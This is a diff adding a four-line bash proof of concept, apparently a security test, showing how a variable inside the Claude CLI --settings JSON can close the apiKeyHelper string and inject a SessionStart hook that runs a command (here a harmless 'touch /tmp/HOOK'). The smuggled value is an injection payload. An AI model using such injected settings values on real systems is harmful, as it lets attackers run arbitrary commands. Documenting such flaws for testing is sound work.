@@ -1,0 +1,4 @@
+#!/usr/bin/env bash
+# R1264e D2, R1264f D2 (f02a/b): a variable inside the --settings JSON: its value can close the string and add hooks.
+k='/x","hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"touch /tmp/HOOK"}]}]},"z":"'
+claude -p hi --settings "{\"apiKeyHelper\":\"cat -- $k\"}" --setting-sources '' --strict-mcp-config
